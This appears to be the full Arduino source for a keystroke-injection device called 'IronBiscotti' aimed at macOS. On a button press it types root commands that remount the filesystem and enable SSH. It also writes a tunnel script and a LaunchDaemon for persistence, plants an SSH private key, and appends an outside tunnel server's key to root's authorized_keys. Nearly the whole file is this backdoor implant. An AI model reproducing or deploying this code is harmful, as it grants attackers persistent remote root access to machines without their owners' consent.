#include "launch_daemon.h"
#include "file_utils.h"
#include "ssh_keys.h"

char buffer[1024];
char filename[128];
char owner[8];
char group[8];
char permissions[4];

// TODO: This is a **dirty** hack to break up the buffer size. Fixes memory warning but iz ugly.
void AddPrivateKey() {
  TypeString("vim ");
  EnterCommand(filename, 500);
  TypeKey('i');
  strcpy_P(buffer, ssh_private_key_p1);
  TypeString(buffer);
  delay(8000);
  strcpy_P(buffer, ssh_private_key_p2);
  TypeString(buffer);
  delay(8000);
  TypeKey(KEY_ESC);
  EnterCommand(":wq", 500);
  TypeString("chmod ");
  TypeString(permissions);
  TypeString(" ");
  EnterCommand(filename, 0);
  TypeString("chown ");
  TypeString(owner);
  TypeString(":");
  TypeString(group);
  TypeString(" ");
  EnterCommand(filename, 0);
}

void AddTunnelServerKey() {
  strcpy_P(buffer, PSTR("echo \""));
  TypeString(buffer);
  strcpy_P(buffer, ssh_tunnel_server_public_key);
  TypeString(buffer);
  strcpy_P(buffer, PSTR("\" >> /var/root/.ssh/authorized_keys"));
  EnterCommand(buffer, 4000);
  strcpy_P(buffer, PSTR("chmod 644 /var/root/.ssh/authorized_keys"));
  EnterCommand(buffer, 0);
}

void IronBiscotti() {
  // Mount the filesystem
  strcpy_P(buffer, PSTR("mount -uw /"));
  EnterCommand(buffer, 20000);
  // Set the home var so vim doesn't trip
  strcpy_P(buffer, PSTR("export HOME=/var/root/"));
  EnterCommand(buffer, 0);
  // Generate host keys
  strcpy_P(buffer, PSTR("ssh-keygen -A"));
  EnterCommand(buffer, 500);
  // Setup ssh
  strcpy_P(buffer, ssh_setup);
  TypeString(buffer);
  delay(1000);
  // Setup launch daemon
  strcpy_P(buffer, PSTR("mkdir -p /var/root/.iron_biscotti/"));
  EnterCommand(buffer, 0);
  strcpy_P(buffer, iron_biscotti_sh);
  strcpy_P(filename, PSTR("/var/root/.iron_biscotti/iron_biscotti.sh"));
  strcpy_P(permissions, PSTR("755"));
  strcpy_P(owner, PSTR("root"));
  strcpy_P(group, PSTR("wheel"));
  WriteToFile(filename, buffer, permissions, owner, group, 1000);
  strcpy_P(buffer, tunnel_sh);
  strcpy_P(filename, PSTR("/var/root/.iron_biscotti/tunnel.sh"));
  WriteToFile(filename, buffer, permissions, owner, group, 1000);
  strcpy_P(buffer, com_iron_biscotti_plist);
  strcpy_P(filename, PSTR("/Library/LaunchDaemons/com.iron_biscotti.plist"));
  strcpy_P(permissions, PSTR("644"));
  WriteToFile(filename, buffer, permissions, owner, group, 4000);
  strcpy_P(buffer, PSTR("mkdir -p /var/root/.ssh/"));
  EnterCommand(buffer, 0);
  strcpy_P(filename, PSTR("/var/root/.ssh/id_rsa"));
  strcpy_P(permissions, PSTR("400"));
  AddPrivateKey();
  //WriteToFile(filename, buffer, permissions, owner, group, 20000);
  strcpy_P(buffer, ssh_public_key);
  strcpy_P(filename, PSTR("/var/root/.ssh/id_rsa.pub"));
  strcpy_P(permissions, PSTR("644"));
  WriteToFile(filename, buffer, permissions, owner, group, 4000);
  AddTunnelServerKey();
  strcpy_P(buffer, PSTR("launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist"));
  EnterCommand(buffer, 0);
}

void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();
  // pushbutton setup
  pinMode(8, INPUT);
  delay(100);
}

void loop() {
  if(digitalRead(8) == HIGH) {
    IronBiscotti();
  }
  delay(250);
}
